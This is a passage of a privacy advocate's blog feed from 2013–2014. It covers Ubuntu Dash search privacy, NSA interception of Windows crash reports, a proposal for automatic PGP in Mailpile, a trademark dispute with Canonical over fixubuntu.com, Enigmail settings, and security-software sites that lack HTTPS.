&lt;p&gt;Canonical, the company that makes Ubuntu, sent me a bogus &lt;a href="https://micahflee.com/2013/11/canonical-shouldnt-abuse-trademark-law-to-silence-critics-of-its-privacy-decisions/"&gt;takedown notice&lt;/a&gt; about it—later apologizing for it. While it made the privacy issue &lt;a href="http://arstechnica.com/information-technology/2013/11/canonical-abused-trademark-law-to-target-a-site-critical-of-ubuntu-privacy/"&gt;blow&lt;/a&gt; &lt;a href="http://www.wired.com/2013/11/fixubuntu/"&gt;up&lt;/a&gt; &lt;a href="http://news.slashdot.org/story/13/11/08/1335231/canonical-targets-ubuntu-privacy-critic"&gt;in&lt;/a&gt; &lt;a href="http://www.reddit.com/r/linux/comments/1q5ba8/canonical_abused_trademark_law_to_target_a_site/"&gt;the&lt;/a&gt; &lt;a href="http://www.techdirt.com/articles/20131107/17583725174/disappointing-to-see-canonical-act-like-trademark-bully-over-ubuntu.shtml"&gt;media&lt;/a&gt; again, Canonical still refused to fix their bad privacy choices.&lt;/p&gt;
&lt;p&gt;&lt;img src="fixubuntu_streisand.png" alt="fixubuntu.com Streisand effect"&gt;&lt;/p&gt;
&lt;p&gt;So after all of this, I’m thrilled to see that Ubuntu 14.04 LTS, which is due for release later this month, &lt;a href="http://www.omgubuntu.co.uk/2014/03/ubuntu-make-amazon-product-results-opt-unity"&gt;won’t include online searches in Dash by default&lt;/a&gt;! For the first time in a year and a half of releases, a default installation of Ubuntu won’t be phoning home with everything you type into Dash, or annoying you with unsolicited ads.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Thank you, Canonical, for finally taking privacy seriously.&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;(While I’m at it: Thank you, Edward Snowden, for making everyone finally start to take privacy seriously.)&lt;/p&gt;
</content></entry><entry><title>Two really simple things Microsoft can do to make Windows more secure against NSA</title><link href="https://micahflee.com/2013/12/two-really-simple-things-microsoft-can-do-to-make-windows-more-secure-against-nsa/" rel="alternate"></link><updated>2013-12-29T00:00:00Z</updated><author><name>Micah Lee</name></author><id>urn:uuid:1a465a7e-6a89-397e-be5f-681d2915003c</id><content type="html">&lt;p&gt;Thanks to Edward Snowden and journalists at Der Spiegel, today we learned about &lt;a href="http://www.spiegel.de/international/world/the-nsa-uses-powerful-toolbox-in-effort-to-spy-on-global-networks-a-940969.html"&gt;Tailored Access Operations&lt;/a&gt; (TAO), NSA’s world-class hacking team. There was a lot of interesting information in that article (like how they divert shipping of electronics to a secret warehouse where they can modify it to install backdoors!).&lt;/p&gt;
&lt;p&gt;But I’m just going to talk about how they use Microsoft error reports to gather private information about Windows computers that can be used to compromise their security — a problem that’s trivially easy for Microsoft to fix.&lt;/p&gt;
&lt;p&gt;You know how Windows programs crash all the time? In order to make that happen less, Microsoft collects information about the crash. They want to know what program crashed and what the current state of your computer is so that they can uncover the bug that you triggered and hopefully fix it in a future update. You can read more about exactly what data gets collected and how Microsoft “protects” this data by reading their &lt;a href="http://windows.microsoft.com/en-US/Windows/microsoft-error-reporting-privacy-statement"&gt;Microsoft Error Reporting Service privacy policy&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img src="windows_error.png" alt="Windows error reporting"&gt;&lt;/p&gt;
&lt;p&gt;Because Microsoft doesn’t use freely available and widely used security and privacy technology, these error reports can be used against Windows users. From the &lt;a href="http://www.spiegel.de/international/world/the-nsa-uses-powerful-toolbox-in-effort-to-spy-on-global-networks-a-940969-2.html"&gt;Spiegel article&lt;/a&gt;:&lt;/p&gt;
&lt;blockquote&gt;&lt;p&gt;One example of the sheer creativity with which the TAO spies approach their work can be seen in a hacking method they use that exploits the error-proneness of Microsoft’s Windows. Every user of the operating system is familiar with the annoying window that occasionally pops up on screen when an internal problem is detected, an automatic message that prompts the user to report the bug to the manufacturer and to restart the program. These crash reports offer TAO specialists a welcome opportunity to spy on computers.&lt;/p&gt;
&lt;p&gt;When TAO selects a computer somewhere in the world as a target and enters its unique identifiers (an IP address, for example) into the corresponding database, intelligence agents are then automatically notified any time the operating system of that computer crashes and its user receives the prompt to report the problem to Microsoft. An internal presentation suggests it is NSA’s powerful XKeyscore spying tool that is used to fish these crash reports out of the massive sea of Internet traffic.&lt;/p&gt;
&lt;p&gt;The automated crash reports are a “neat way” to gain “passive access” to a machine, the presentation continues. Passive access means that, initially, only data the computer sends out into the Internet is captured and saved, but the computer itself is not yet manipulated. Still, even this passive access to error messages provides valuable insights into problems with a targeted person’s computer and, thus, information on security holes that might be exploitable for planting malware or spyware on the unwitting victim’s computer.&lt;/p&gt;
&lt;p&gt;Although the method appears to have little importance in practical terms, the NSA’s agents still seem to enjoy it because it allows them to have a bit of a laugh at the expense of the Seattle-based software giant. In one internal graphic, they replaced the text of Microsoft’s original error message with one of their own reading, “This information may be intercepted by a foreign sigint system to gather detailed information and better exploit your machine.” (“Sigint” stands for “signals intelligence.”)&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;So how could Microsoft easily prevent this from happening? They can do these two things:&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Use HTTPS!&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;There’s no reason why any piece of software that needs to communicate back to its company’s servers shouldn’t use HTTPS instead of HTTP. It’s not hard to set up or maintain, it’s not expensive, it scales really well. It’s ridiculous that Mirosoft, the largest software company in the world, still uses HTTP for anything.&lt;/p&gt;
&lt;p&gt;If they were using HTTPS, NSA would have to compromise the SSL key or do active man-in-the-middle attacks to get these error reports (and even man-in-the-middle attacks could be prevented with certificate pinning). However, just using HTTPS isn’t quite enough. Even if the error reports are encrypted, NSA can still force Microsoft to hand over their error report database.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Use Tor!&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Windows, and every other operating system, should come with Tor installed. When software wants to send “anonymous error reports,” or “anonymous usage data to improve our service,” or anything else like that, they should actually make it anonymous by proxying those requests through the Tor network.&lt;/p&gt;
&lt;p&gt;If Tor is installed, other software should use it to send anonymous data back home too. Firefox and Chrome should send error reports and usage data to Mozilla and Google over Tor instead of over the normal Internet. Ubuntu’s Unity should send “anonymous” Dash search results to productsearch.ubuntu.com over Tor, or else they can’t truly claim that they’re anonymous.&lt;/p&gt;
&lt;p&gt;These technologies are freely available, widely used, and open source. It’s time that companies start acting like everything that happens on the Internet is being spied on.&lt;/p&gt;
</content></entry><entry><title>How Mailpile can implement opportunistic PGP email encryption</title><link href="https://micahflee.com/2013/12/how-i-want-mailpile-to-handle-openpgp/" rel="alternate"></link><updated>2013-12-02T00:00:00Z</updated><author><name>Micah Lee</name></author><id>urn:uuid:6655fd13-cda5-37c2-af41-0e54644443d5</id><content type="html">&lt;p&gt;For those wanting to decentralize the Internet and encrypt all the things, Mailpile is a hot topic.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;What’s Mailpile?&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Mailpile is a web-based email client (like Thunderbird or Outlook, not to be confused with a service, like Gmail) that you install locally and access by opening &lt;a href="http://localhost:33411/"&gt;http://localhost:33411/&lt;/a&gt; in your browser.&lt;/p&gt;
&lt;p&gt;The goal of Mailpile is to give everyone all the nice features they’re used to with Gmail but that you don’t get with a traditional email client, like labels, conversations, and really quick search. You can use Mailpile to check any email address (including your @gmail.com one).&lt;/p&gt;
&lt;p&gt;Right now Gmail is overwhelmingly the most popular email provider because it’s such a good product. If you want to escape Google’s centralized one-stop-PRISM-shop email service you have to put up with something that’s more annoying to use. Mailpile promises to make any email service you want to use as usable as Gmail, with the added benefit that Google-bots don’t parse the contents of your email and serve targeted ads, and that you have a choice of who to host your email with (perhaps you want to host it in Iceland, or on a home server). Basically, it might help break Gmail’s deathgrip on the email market, and considerably re-decentralize email.&lt;/p&gt;
&lt;p&gt;But what the cypherpunks are most excited about is that Mailpile has the potential to make PGP-encrypted email not suck nearly as much as it does today.&lt;/p&gt;
&lt;p&gt;&lt;em&gt;Note: Mailpile is an &lt;a href="https://github.com/pagekite/mailpile"&gt;open source project&lt;/a&gt; that’s been funded by a successful Indiegogo campaign. Right now it’s in a pre-alpha state, so it doesn’t work yet. The alpha is scheduled for release in January.&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;How will PGP be different in Mailpile?&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Everyone wants to use PGP email encryption in the Gmail web interface. There have been plenty of attempts at building PGP browser add-ons (&lt;a href="http://mailvelope.com/"&gt;Mailvelope&lt;/a&gt; seems to be the most promising right now) but so far nothing has really stuck because of some fundamental problems about glueing PGP onto a system that was never designed for it.&lt;/p&gt;
&lt;p&gt;Mailpile is being designed for it. When you open an encrypted email in Mailpile the server detects that it’s encrypted and calls out to gpg to decrypt it using gpg-agent. Your operating system pops up a passphrase dialog, so your passphrase never goes through the browser. All OpenPGP operations happen as system calls to gpg, the same way it works with Enigmail. Additionally, since Mailpile will have access to all your local email, it will be possible to do things such as search encrypted email.&lt;/p&gt;
&lt;p&gt;This is a chance to build the user interface for OpenPGP correctly and to remove all of the friction from using it. In fact, I believe that Mailpile could pretty effectively make PGP encrypted email encryption happen almost in the background, without the user needing to do much of anything.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;How can Mailpile make using PGP suck less?&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Mailpile should encourage a PGP trust system similar to how SSH trust works, Trust-On-First-Use (TOFU). Since there’s a very small chance that you’ll be the victim of an active man-in-the-middle attack the very first time you see a public key, you can go ahead and assume that the first key you saw is valid. With, of course, the ability to change this trust setting manually for each key.&lt;/p&gt;
&lt;p&gt;This proposal relies heavily on using key servers, and Mailpile should communicate with key servers using Tor. Not using Tor would leak information about who you are and who emails you. The Windows and Mac versions will have a trickier time with a Tor dependency, but it’s certainly possible and I think it’s absolutely worth it.&lt;/p&gt;
&lt;p&gt;Everyone should have a PGP key. When you setup an account in Mailpile it should help you create a PGP key if you don’t already have one. If you create a new PGP key and already have old secret keys in your keyring, it should offer to sign your new key with your old ones. Each time you add a new Mailpile account it should offer to add a new user ID to your primary key. Every time your key is changed it should upload your modified key to key servers.&lt;/p&gt;
&lt;p&gt;Mailpile should keep a local database of metadata about PGP keys. For each public key it knows about it should record the timestamp from the first time you saw it in your email. Each key should also have a trust settings: either “trusted”, “not trusted”, or “automatic”, completely separate from any data that’s stored in the actual PGP key packets (like user trust or signatures).&lt;/p&gt;
&lt;p&gt;Every time you see a PGP-signed email, if the user doesn’t already have the PGP key that signed that email it should search key servers for it and download it. When you add a new account it should also search all of your old email for signatures and try downloading all of those public keys from key servers, too.&lt;/p&gt;
&lt;p&gt;All emails should default to being signed, and as many emails as possible should be encrypted by default. When you write a new email and put email addresses in the To, CC, and BCC fields, if you have “trusted” PGP keys for all recipients, the email should default to being encrypted.&lt;/p&gt;
&lt;p&gt;The question is: what does “trusted” mean? Since we want to rely on TOFU by default I think it should mean this:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;If you have signed the key, it should be trusted.&lt;/li&gt;
&lt;li&gt;If you have manually marked it as “trusted” in the Mailpile interface, it should be trusted.&lt;/li&gt;
&lt;li&gt;If you have manually marked it as “untrusted” in the Mailpile interface, it should be untrusted.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;If you haven’t signed it and you haven’t marked it as “trusted” or “untrusted”, it should use this algorthim (or something similar) to make an intelligent decision about whether this public key should be trustworthy enough to encrypt the message to:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;If this is the only key that includes a user ID with the recipient’s email address on, it should be trusted.&lt;/li&gt;
&lt;li&gt;Elif all other keys that include a user ID with the recipient’s email address have signed this key, it should be trusted.&lt;/li&gt;
&lt;li&gt;Elif this is the &lt;em&gt;first&lt;/em&gt; key you’ve seen that includes a user ID with the recipient’s email address on it, it should be trusted.&lt;/li&gt;
&lt;li&gt;Otherwise, it should be untrusted.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;What would this do?&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;With these defaults, a couple things will happen. You’ll automatically download the public keys of everyone else that you email that uses PGP. When you write emails, they’ll get opportunistically encrypted. If a bunch of different people who regularly email each other all use Mailpile, they don’t have to change any behavior at all, and all their email will automatically get encrypted.&lt;/p&gt;
&lt;p&gt;If people try to attack this system by sending you emails that are signed with malicious keys pretending to be other people, you won’t trust those keys by default. You’ll still encrypt to the first key you saw.&lt;/p&gt;
&lt;p&gt;If someone creates a new PGP key for their email address and you still have their old one, the first time you email them you’ll encrypt it to the wrong key (unless they’ve been good PGP users and signed their new key with their old one, in which case it will just work). However, you should be able to quickly work out the problem and manually mark the new key as “trusted”. From that point on it should just work.&lt;/p&gt;
&lt;p&gt;You can use PGP completely safely, and have very high confidence that most of the public keys you use are valid, without having to participate in or even know what the Web of Trust is. If you do use the Web of Trust, all the keys you sign would be trusted like you expect.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;So wait, does this exist?&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Nope, it’s just an idea. But I think it could work pretty well.&lt;/p&gt;
&lt;p&gt;If other people agree that it’s a good idea, I’d love it if the Mailpile developers decided to implement it as default behavior in Mailpile. If not, I’d love it if at least someone could build a Mailpile plugin that does this.&lt;/p&gt;
</content></entry><entry><title>Leaving EFF and joining a fearless team of journalists</title><link href="https://micahflee.com/2013/11/leaving-eff-and-joining-a-fearless-team-of-journalists/" rel="alternate"></link><updated>2013-11-15T00:00:00Z</updated><author><name>Micah Lee</name></author><id>urn:uuid:47e86610-464c-38dd-bc6f-7655102aad23</id><content type="html">&lt;p&gt;I started working at the &lt;a href="https://www.eff.org/"&gt;Electronic Frontier Foundation&lt;/a&gt; in March of 2011. I joined the tech team as EFF’s first full-fledged web developer, eventually switching jobs internally to become a staff technologist. After over two and a half years of working with the most inspiring group of people I’ve ever met, I’m moving on to join a startup. Monday is my last day of work at EFF.&lt;/p&gt;
&lt;p&gt;Pierre Omidyar, Glenn Greenwald, Laura Poitras, Jeremy Scahill, and a fantastic team of people are starting a media organization that will &lt;a href="http://www.nytimes.com/2013/10/21/business/media/an-interview-with-pierre-omidyar.html"&gt;redefine journalism&lt;/a&gt;, and I’m joining its tech team. My focus will be on using technology to ensure that the constitutional rights of journalists cannot be violated by powerful spy agencies or anyone else.&lt;/p&gt;
&lt;p&gt;I’m ecstatic about my change in career, and there are so many ideas buzzing around my head about it. But I’ll wait until we launch our website before talking about the new company. Instead I’m going to talk about my time at EFF.&lt;/p&gt;
&lt;p&gt;Some of the exciting things I was a part of at EFF included:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Migrating EFF away from an expensive, third-party, proprietary service (for sending email blasts, action alerts, and accepting donations) Convio into the open source, self-hosted software &lt;a href="https://civicrm.org/"&gt;CiviCRM&lt;/a&gt;. As part of my work at EFF I got to become a major CiviCRM contributor, and travel around the world to code sprints and conferences to help improve this software for all non-profits.&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.eff.org/deeplinks/2011/05/help-bring-disk-encryption-ubuntu-live-cd"&gt;Encouraged&lt;/a&gt; Ubuntu, the most popular GNU/Linux distribution used by 25 million people, to have more user-friendly support for disk encryption, and ultimately &lt;a href="https://www.eff.org/deeplinks/2012/11/privacy-ubuntu-1210-full-disk-encryption"&gt;succeeded&lt;/a&gt;.&lt;/li&gt;
&lt;li&gt;Helped kill the Internet censorship bills SOPA and PIPA, including helping organize the largest protest in Internet history (Internet Blackout Day), and spending four sleepless days building a web app that sent a million emails to Congress.&lt;/li&gt;
&lt;li&gt;Spoke at open source and hacker conferences about things like &lt;a href="https://www.youtube.com/watch?v=q38HdGGWS78"&gt;Privacy Tricks for Activist Web Developers&lt;/a&gt;.&lt;/li&gt;
&lt;li&gt;Since becoming a staff technologist, I’ve explained how crypto and computer security works (and how the NSA is actively trying to make it not work) to journalists all over the world in interviews for their stories. I’ve also given advice to journalists on safe ways to communicate with sources.&lt;/li&gt;
&lt;li&gt;As I finish my last days at EFF I’m putting finishing touches on an email bot that will teach people the way-too-complicated art of encrypting email with OpenPGP.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;I’ve never worked with a more friendly, happy, and excited group of people. Everyone who works at EFF works there because there’s nowhere they would rather be. As an organization, EFF is genuinely principled and values the important and ground-breaking work that they do on a daily basis over anything else. I’m so privileged to have had the opportunity with work with them.&lt;/p&gt;
</content></entry><entry><title>Canonical shouldn’t abuse trademark law to silence critics of its privacy decisions</title><link href="https://micahflee.com/2013/11/canonical-shouldnt-abuse-trademark-law-to-silence-critics-of-its-privacy-decisions/" rel="alternate"></link><updated>2013-11-07T00:00:00Z</updated><author><name>Micah Lee</name></author><id>urn:uuid:d865d66a-e30e-327b-b96b-972ee0e060a0</id><content type="html">&lt;p&gt;I run the website &lt;a href="https://fixubuntu.com/"&gt;fixubuntu.com&lt;/a&gt;, a place to quickly and easily learn how to disable the privacy-invasive features that are enabled by default in Ubuntu.&lt;/p&gt;
&lt;p&gt;This morning I received this email from an employee of Canonical Limited, the company that owns and manages the Ubuntu project:&lt;/p&gt;
&lt;blockquote&gt;&lt;p&gt;Subject: Your Use of Ubuntu&lt;/p&gt;
&lt;p&gt;From: &lt;strong&gt;&lt;strong&gt;&lt;em&gt;**&lt;/em&gt;&lt;/strong&gt;&lt;/strong&gt;@canonical.com&lt;/p&gt;
&lt;p&gt;Dear Micah,&lt;/p&gt;
&lt;p&gt;Canonical Limited (“Canonical”) owns and manages the intellectual property rights in Ubuntu and other associated intellectual property. In addition, Canonical is the owner of numerous trademarks and copyright throughout the world relating to Ubuntu, including Ubuntu logo and the word mark of Ubuntu.&lt;/p&gt;
&lt;p&gt;It has been brought to our attention that your website: &lt;a href="https://fixubuntu.com/"&gt;https://fixubuntu.com/&lt;/a&gt; is using Canonical’s trademarks including Ubuntu logo on your website and Ubuntu word in your domain name. The Ubuntu logo [1] and a screenshot of your website [2] are set out below.&lt;/p&gt;
&lt;p&gt;We are really pleased to know your interest in writing about Ubuntu. But whilst we can appreciate the passion Ubuntu inspires, we also have to be diligent to ensure that Ubuntu’s trademarks are used correctly.&lt;/p&gt;
&lt;p&gt;To keep the balance between the integrity of our trademarks and the ability to to use and promote Ubuntu, we’ve tried to define a reasonable Intellectual Property Policy. You can read the full policy at &lt;a href="http://www.canonical.com/intellectual-property-policy"&gt;http://www.canonical.com/intellectual-property-policy&lt;/a&gt;. As you can see from our policy, to use the Ubuntu trademarks and and Ubuntu word in a domain name would require approval from Canonical.&lt;/p&gt;
&lt;p&gt;Unfortunately, in this instance we cannot give you permission to use Ubuntu trademarks on your website and in your domain name as they may lead to confusion or the misunderstanding that your website is associated with Canonical or Ubuntu.&lt;/p&gt;
&lt;p&gt;So, whilst we are very happy for you to write about Ubuntu, we request you to remove Ubuntu word from you domain name and Ubuntu logo from your website. We would highly appreciate if you could confirm you have done so by replying this email to us.&lt;/p&gt;
&lt;p&gt;Thank you for your cooperation and we look forward to hearing from you.&lt;/p&gt;
&lt;p&gt;If you have any further questions, please feel free to contact us.&lt;/p&gt;
&lt;p&gt;[1] Ubuntu Logo&lt;/p&gt;
&lt;p&gt;&lt;img src="ubuntu1.png" alt=""&gt;&lt;/p&gt;
&lt;p&gt;[2] A screenshot of your website&lt;/p&gt;
&lt;p&gt;&lt;img src="ubuntu2.png" alt=""&gt;&lt;/p&gt;
&lt;p&gt;Yours faithfully,&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;Paralegal&lt;/p&gt;
&lt;p&gt;Canonical&lt;/p&gt;
&lt;p&gt;Blue Fin Building, 5th Floor&lt;/p&gt;
&lt;p&gt;110 Southwark Street, SE1 0SU&lt;/p&gt;
&lt;p&gt;Direct Dial: +44 (0)20 7630 2417&lt;/p&gt;
&lt;p&gt;Ubuntu – Linux for Human Beings&lt;/p&gt;
&lt;p&gt;www.canonical.com | www.ubuntu.com&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;The first thing I would like to say is my use of the Ubuntu logo and the word “ubuntu” in my domain name falls under &lt;a href="https://en.wikipedia.org/wiki/Nominative_use"&gt;nominative use&lt;/a&gt;. Although I’m perfectly within my rights to continue using both, I’ve decided to remove the Ubuntu logo from the website, but add a disclaimer—because it seems like a nice thing to do.&lt;/p&gt;
&lt;blockquote&gt;&lt;p&gt;Disclaimer: In case you are either 1) a complete idiot; or 2) a lawyer; or 3) both, please be aware that this site is not affiliated with or approved by Canonical Limited. This site criticizes Canonical for certain privacy-invading features of Ubuntu and teaches users how to fix them. So, obviously, the site is not approved by Canonical. And our use of the trademarked term Ubuntu is plainly descriptive—it helps the public find this site and understand its message.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Canonical employees: If this still bothers you, there’s a simple thing you can do to make me completely shut down the website. You can require users to opt-in to you collecting information about what they’re searching for on their own computers and then displaying ads to them about it, rather than violating their privacy by default. If people didn’t need to find websites that teach them how to opt out, there would be no reason for me to run fixubuntu.com. It’s as simple as:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;gsettings set com.canonical.Unity.Lenses remote-content-search none
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Sending a (very polite, which I appreciate) takedown request isn’t very much in the spirit of open source. If you’d like to improve fixubuntu.com in a more productive way, then I suggest you submit a patch. The code for fixubuntu.com is licensed under the &lt;a href="https://fixubuntu.com/LICENSE"&gt;GNU Affero General Public License&lt;/a&gt;, and the code is hosted on &lt;a href="https://github.com/micahflee/fixubuntu"&gt;Github&lt;/a&gt;. Pull requests are welcome.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;UPDATE:&lt;/strong&gt; Here is the letter that EFF staff attorney &lt;a href="https://twitter.com/danielnazer"&gt;Daniel Nazer&lt;/a&gt; wrote in response to the takedown notice.&lt;/p&gt;
&lt;p&gt;&lt;img src="ubuntu_letter.jpg" alt="EFF&amp;#39;s letter"&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;UPDATE 2:&lt;/strong&gt; &lt;a href="http://blog.canonical.com/2013/11/08/trademarks-community-and-criticism/"&gt;Canonical responds&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;UPDATE 3:&lt;/strong&gt; “This was a bit silly on our part, sorry,” &lt;a href="https://plus.google.com/116812394236590806058/posts/5jdibY5iR9b"&gt;apologizes Mark Shuttleworth&lt;/a&gt;.&lt;/p&gt;
</content></entry><entry><title>HTML email, attachments, and flowed text in Enigmail</title><link href="https://micahflee.com/2013/09/html-email-attachments-and-flowed-text-in-enigmail/" rel="alternate"></link><updated>2013-09-19T00:00:00Z</updated><author><name>Micah Lee</name></author><id>urn:uuid:78a11082-567d-32d9-830b-46d225d9f781</id><content type="html">&lt;p&gt;I’ve noticed that a lot of people who are new to GPG really don’t want to give up their HTML email, but the Enigmail setup wizard recommends that you do this.&lt;/p&gt;
&lt;p&gt;&lt;img src="enigmail_wizard1.png" alt="Enigmail Setup Wizard"&gt;&lt;/p&gt;
&lt;p&gt;People have also had weird problems with email attachments when sending signed or encrypted emails. And when you use Enigmail’s default settings and compose your messages in plaintext, Enigmail also turns off “flowed text”, so that lines get wrapped at 72 characters.&lt;/p&gt;
&lt;p&gt;Well, none of this is actually a problem if you use PGP/MIME, which is the recommended way of using OpenPGP anyway. You can safely compose messages in HTML, there are no problems with attachments, and if you use plaintext email it’s completely fine to use flowed text. Here’s how to configure Thunderbird to work with PGP/MIME.&lt;/p&gt;
&lt;p&gt;Go to Account Settings. In Windows and Linux this is in the Edit menu, in Mac OS X this is in the Tools menu. Go to the OpenPGP Security page (if you have multiple Thunderbird accounts you’ll need to do this for each one).&lt;/p&gt;
&lt;p&gt;&lt;img src="enigmail_pgpmime.png" alt="Enabling PGP/MIME"&gt;&lt;/p&gt;
&lt;p&gt;Make sure that “Use PGP/MIME by default” is checked. While you’re at it, you might want to sign both non-encrypted and encrypted messages by default.&lt;/p&gt;
&lt;p&gt;Once you have enabled PGP/MIME, it’s completely safe to use HTML email, attachments don’t have any problems, and it’s also safe to use flowed text for plaintext emails.&lt;/p&gt;
&lt;p&gt;If you’d like to turn on HTML email, go to the Composition &amp;amp; Addressing page and make sure “Compose messages in HTML format” is checked. &lt;em&gt;Note: There are valid arguments against HTML email, but it’s not a security problem, and some people hate plaintext email. So it’s fine.&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;If you do want to use plaintext email, you can enable flowed text by going to Preferences. In Windows and Linux it’s in the Edit menu, in Mac OS X it’s in the Thunderbird menu. From there go to Advanced, then the General tab, and click Config Editor in the bottom right.&lt;/p&gt;
&lt;p&gt;&lt;img src="enigmail_configeditor1.png" alt="Thunderbird Config Editor"&gt;&lt;/p&gt;
&lt;p&gt;When you open it it says “This might void your warranty!”, but you can go ahead and click “I’ll be careful, I promise”. This is the exact same thing as going to about:config in Firefox. Then you can search for “send_plaintext_flowed” and double-click the setting to change the value from false to true. And by the way, you can change all of Thunderbird’s preferences from in here too, including ones that don’t have a GUI for changing, and some of them might break everything, so be careful.&lt;/p&gt;
</content></entry><entry><title>Don’t Succumb to Security Nihilism</title><link href="https://micahflee.com/2013/09/dont-succumb-to-security-nihilism/" rel="alternate"></link><updated>2013-09-05T00:00:00Z</updated><author><name>Micah Lee</name></author><id>urn:uuid:8d1734e4-65d2-39af-b8d3-99b503a9de34</id><content type="html">&lt;p&gt;You might have read today’s shocking &lt;a href="http://www.theguardian.com/world/2013/sep/05/nsa-gchq-encryption-codes-security"&gt;Guardian&lt;/a&gt; and &lt;a href="http://www.nytimes.com/2013/09/06/us/nsa-foils-much-internet-encryption.html?_r=0"&gt;New York Times&lt;/a&gt; articles outlining the many ways that NSA and GCHQ have defeated crypto on the Internet, and have influenced tech companies to insert back doors into their commercial security products.&lt;/p&gt;
&lt;p&gt;But pay close attention to this paragraph in Guardian’s article:&lt;/p&gt;
&lt;blockquote&gt;&lt;p&gt;The agencies have not yet cracked all encryption technologies, however, the documents suggest. Snowden appeared to confirm this during a live Q&amp;amp;A with Guardian readers in June. “Encryption works. Properly implemented strong crypto systems are one of the few things that you can rely on,” he said before warning that NSA can frequently find ways around it as a result of weak security on the computers at either end of the communication.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Giving up and deciding that privacy is dead is &lt;em&gt;counterproductive&lt;/em&gt;. We need to stop using commercial crypto. We need to make sure that free software crypto gets serious security and usability audits.&lt;/p&gt;
&lt;p&gt;If we do this right we can still have privacy in the 21st century. If we give up on security because of this we will definitely lose.&lt;/p&gt;
</content></entry><entry><title>It’s 2013. We’re all being spied on. Why do security software websites not use HTTPS?</title><link href="https://micahflee.com/2013/08/its-2013-were-all-being-spied-on-why-do-security-software-websites-not-use-https/" rel="alternate"></link><updated>2013-08-28T00:00:00Z</updated><author><name>Micah Lee</name></author><id>urn:uuid:d869dc13-1e62-3415-ac91-79bd6edba0a8</id><content type="html">&lt;p&gt;&lt;strong&gt;Update:&lt;/strong&gt; This post made the &lt;a href="http://www.reddit.com/r/technology/comments/1ladvh/its_2013_were_all_being_spied_on_why_do_security/"&gt;frontpage of reddit&lt;/a&gt; and many of the comments are &lt;a href="https://xkcd.com/386/"&gt;wrong&lt;/a&gt;. I took a moment to clear a couple things up at the bottom of the post.&lt;/p&gt;
&lt;p&gt;We desperately need to work towards deprecating HTTP and replacing it only with HTTPS. The web is a huge part of what billions of people use the Internet for, and still most of it is not encrypted. Since the Snowden leaks started getting published we’ve learned that NSA and GCHQ spy on as close to the entire Internet as they can get.&lt;/p&gt;
&lt;p&gt;It would be naive to think that the US and UK are the only governments doing this too. The network isn’t safe, and the only way to make it safe is to encrypt all the things. Websites that still use HTTP are putting users in danger. Here are a couple of examples.&lt;/p&gt;
&lt;p&gt;If you’re a Windows user and you heard that you can use something called Off the Record (OTR) to have end-to-end encrypted chats with your friends, how do you get started?&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;First you go to &lt;a href="https://pidgin.im/"&gt;https://pidgin.im/&lt;/a&gt; and download Pidgin. This website forces HTTPS, so you probably haven’t gotten hacked yet.&lt;/li&gt;
&lt;li&gt;After downloading and installing Pidgin you need to download and install the OTR plugin. So you go to &lt;a href="http://www.cypherpunks.ca/otr/"&gt;http://www.cypherpunks.ca/otr/&lt;/a&gt; and download the latest OTR installer, which at the time of writing is &lt;a href="http://www.cypherpunks.ca/otr/binaries/windows/pidgin-otr-4.0.0-1.exe"&gt;http://www.cypherpunks.ca/otr/binaries/windows/pidgin-otr-4.0.0-1.exe&lt;/a&gt;. This website does not force or even use HTTPS, which means it would be trivial for spy agencies or random hackers on your wifi network to put malware on your computer.&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;strong&gt;For some reason cypherpunks.ca, the website that distributes Windows binaries of OTR, doesn’t use HTTPS and therefore puts OTR users at risk.&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Let’s say you’re a Windows user and you’re interested in using OpenPGP email encryption. How do you get started?&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;The free software implementation of OpenPGP is GnuPG (GPG), so first you go to &lt;a href="http://gnupg.org/"&gt;http://gnupg.org/&lt;/a&gt; to see what to do next. This websites doesn’t force or even use HTTPS, which means any information you find on this website might not be trustworthy, and any links to download GPG installers might include malware.&lt;/li&gt;
&lt;li&gt;Assuming you haven’t already been hacked, you’ll notice that the easiest way to get GPG in Windows is to visit &lt;a href="http://www.gpg4win.org/"&gt;http://www.gpg4win.org/&lt;/a&gt; and download the latest version which, at the time of this writing, is &lt;a href="http://files.gpg4win.org/gpg4win-2.2.0.exe"&gt;http://files.gpg4win.org/gpg4win-2.2.0.exe&lt;/a&gt;. It would be trivial for spy agencies or random hackers to replace this with a malicious version and put malware on your computer.&lt;/li&gt;
&lt;/ol&gt;
